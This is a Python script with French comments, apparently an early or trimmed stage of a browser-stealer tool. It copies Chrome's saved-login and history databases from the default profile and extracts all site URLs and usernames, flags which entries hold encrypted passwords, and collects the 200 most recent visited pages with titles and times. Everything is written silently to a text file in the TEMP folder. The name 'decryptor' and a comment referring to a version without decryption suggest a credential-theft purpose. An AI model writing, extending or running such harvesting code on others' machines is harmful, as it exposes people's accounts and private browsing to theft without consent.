# decryptor.py - Version pour extraire infos SANS déchiffrement des mots de passe

import os
import sqlite3
import shutil
from datetime import datetime, timedelta
import sys

# --- Constantes Globales ---
LOGIN_DB_NAME = "Login Data"
HISTORY_DB_NAME = "History"
TEMP_LOGIN_COPY = "login_db_copy.sqlite"
TEMP_HISTORY_COPY = "history_db_copy.sqlite"
# Fichier de sortie unique contenant les infos extraites
COMBINED_OUTPUT_FILENAME = "extracted_data.txt"
HISTORY_LIMIT = 200 # Limiter le nombre d'entrées d'historique extraites

# --- Fonctions Utilitaires ---
def get_chrome_datetime(chromedate):
    """Convertit le format de date Chrome en objet datetime Python."""
    if isinstance(chromedate, (int, float)) and chromedate > 0:
         try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
         except OverflowError: return "Date invalide/trop grande"
         except Exception: return "Date invalide"
    return ""

def get_profile_path():
    """Retourne le chemin du profil Chrome par défaut."""
    local_app_data = os.environ.get("LOCALAPPDATA")
    if local_app_data:
        path = os.path.join(local_app_data, "Google", "Chrome", "User Data")
        if os.path.isdir(path) and os.path.isdir(os.path.join(path, "Default")):
            return path
    # Tenter un chemin alternatif si le premier échoue (moins courant)
    app_data = os.environ.get("APPDATA")
    if app_data:
         path = os.path.join(app_data, "..", "Local", "Google", "Chrome", "User Data") # Remonter d'un niveau depuis Roaming
         path = os.path.normpath(path) # Normaliser le chemin
         if os.path.isdir(path) and os.path.isdir(os.path.join(path, "Default")):
             return path
    return None

def copy_db_file(profile_path, db_name, temp_name):
    """Copie un fichier DB depuis le profil (sous-dossier Default) vers TEMP."""
    original_path = os.path.join(profile_path, "Default", db_name)
    temp_dir = os.environ.get("TEMP", ".")
    temp_path = os.path.join(temp_dir, temp_name)
    error_msg = None
    if not os.path.exists(original_path):
        return None, f"Erreur: Fichier '{db_name}' introuvable: {original_path}"
    try:
        # Supprimer l'ancienne copie si elle existe pour éviter les erreurs
        if os.path.exists(temp_path):
            os.remove(temp_path)
        shutil.copyfile(original_path, temp_path)
    except Exception as e:
        return None, f"Erreur copie '{db_name}': {e}"
    return temp_path, None


# --- Fonctions Principales ---

def get_logins_info_only(profile_path):
    """Extrait les infos (URL, User) et indique si un mot de passe chiffré existe."""
    results = []
    temp_db_path, error_msg = copy_db_file(profile_path, LOGIN_DB_NAME, TEMP_LOGIN_COPY)
    if error_msg:
        results.append(error_msg)
        return results

    conn = None
    processed_count = 0
    password_found_count = 0
    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins") # On lit toujours password_value

        for row in cursor.fetchall():
            processed_count += 1
            origin_url, username, encrypted_password_blob = row[:3]

            # Indiquer si un mot de passe chiffré est présent ou non
            if encrypted_password_blob:
                password_status = "[Données Chiffrées Présentes]"
                password_found_count += 1
            else:
                password_status = "[Vide]"

            result_line = f"URL: {origin_url}\nUser: {username}\nPass: {password_status}"
            results.append(result_line)
            results.append("-" * 20)

        results.insert(0, f"Entrées Login Data traitées: {processed_count}")
        results.insert(1, f"Entrées avec mot de passe chiffré trouvé: {password_found_count}")
        results.insert(2, "NOTE: Les mots de passe sont chiffrés et n'ont pas été déchiffrés par ce script.")
        results.insert(3, "-" * 20)

    except sqlite3.Error as e:
        results.append(f"Erreur SQLite (Login Data): {e}")
    except Exception as e:
        results.append(f"Erreur Générale (Login Data): {e}")
    finally:
        if conn: conn.close()
        # Nettoyer la copie temporaire
        if temp_db_path and os.path.exists(temp_db_path):
            try: os.remove(temp_db_path)
            except OSError as e: results.append(f"Warn: Echec suppression {TEMP_LOGIN_COPY}: {e}")

    return results


def get_history(profile_path, limit=HISTORY_LIMIT):
    """Extrait l'historique de navigation (inchangé)."""
    results = []
    temp_db_path, error_msg = copy_db_file(profile_path, HISTORY_DB_NAME, TEMP_HISTORY_COPY)
    if error_msg:
        results.append(error_msg)
        return results

    conn = None
    processed_count = 0
    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        query = f"""
            SELECT urls.url, urls.title, visits.visit_time FROM urls
            JOIN visits ON urls.id = visits.url ORDER BY visits.visit_time DESC LIMIT ?
        """
        cursor.execute(query, (limit,)) # Passer la limite comme paramètre sécurisé
        for row in cursor.fetchall():
            processed_count +=1
            url, title, visit_time_us = row[:3]
            title = title if title else "N/A"
            visit_time = get_chrome_datetime(visit_time_us)
            results.append(f"Date: {visit_time}\nTitre: {title}\nURL: {url}")
            results.append("-" * 20)
        results.insert(0, f"Entrées historique (max {limit}): {processed_count}")
        results.insert(1, "-" * 20)
    except sqlite3.Error as e:
        results.append(f"Erreur SQLite (History): {e}")
    except Exception as e:
        results.append(f"Erreur Générale (History): {e}")
    finally:
        if conn: conn.close()
        # Nettoyer la copie temporaire
        if temp_db_path and os.path.exists(temp_db_path):
             try: os.remove(temp_db_path)
             except OSError as e: results.append(f"Warn: Echec suppression {TEMP_HISTORY_COPY}: {e}")

    return results


def main():
    """Fonction principale: extrait infos login (sans déchiffrer) et historique."""
    profile_path = get_profile_path()
    if not profile_path:
        error_msg = "ERREUR CRITIQUE: Chemin profil Chrome introuvable."
        try: # Tenter d'écrire l'erreur fatale
            with open(os.path.join(os.environ.get("TEMP", "."), "extractor_FATAL_ERROR.txt"), "w") as f: f.write(error_msg)
        except: pass
        sys.stderr.write(error_msg + "\n"); exit(1)

    # --- Section Infos Login ---
    login_results = ["--- INFOS LOGIN CHROME (Mots de passe chiffrés) ---"]
    login_results.append("-" * 20)
    login_results.extend(get_logins_info_only(profile_path))

    # --- Section Historique ---
    history_results = ["\n\n--- HISTORIQUE DE NAVIGATION (RECENT) ---"]
    history_results.extend(get_history(profile_path))

    # --- Écriture Fichier ---
    combined_results = login_results + history_results
    output_path = os.path.join(os.environ.get("TEMP", "."), COMBINED_OUTPUT_FILENAME)
    try:
        with open(output_path, "w", encoding="utf-8") as f:
            f.write("\n".join(combined_results))
    except Exception as e:
        error_msg = f"Erreur écriture fichier sortie '{output_path}': {e}"; sys.stderr.write(error_msg + "\n")
        try: # Tenter d'écrire l'erreur d'écriture
            with open(os.path.join(os.environ.get("TEMP", "."), "extractor_WRITE_ERROR.txt"), "w") as f: f.write(error_msg)
        except: pass

if __name__ == "__main__":
    # Exécution principale avec gestion d'erreur globale
    try:
        main()
    except Exception as e:
        error_msg = f"ERREUR GLOBALE NON CAPTURÉE DANS main(): {type(e).__name__}: {e}"
        try: # Tenter d'écrire l'erreur fatale
            with open(os.path.join(os.environ.get("TEMP", "."), "extractor_FATAL_ERROR.txt"), "w") as f: f.write(error_msg)
        except: pass
        sys.stderr.write(error_msg + "\n"); exit(1)